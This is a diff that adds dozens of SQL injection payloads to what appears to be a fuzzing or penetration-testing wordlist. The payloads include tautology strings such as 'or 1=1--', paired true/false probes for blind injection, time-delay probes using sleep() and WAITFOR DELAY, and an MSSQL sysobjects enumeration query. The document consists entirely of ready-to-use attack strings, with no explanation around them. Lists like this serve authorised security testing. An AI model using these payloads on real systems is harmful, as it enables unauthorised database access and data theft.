@@ -1,3 +1,57 @@
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+(select * from (select(sleep(10)))a)%2c(select%20*%20from%20(select(sleep(10)))a)';WAITFOR DELAY '0:0:30'--
+OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND ('1427=1427
+ AND 7506=9091 AND ('5913=5913
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 7300=7300 AND ('pKlZ'='pKlZ
+ AND 7300=7300 AND ('pKlZ'='pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
 union
 union all
 select
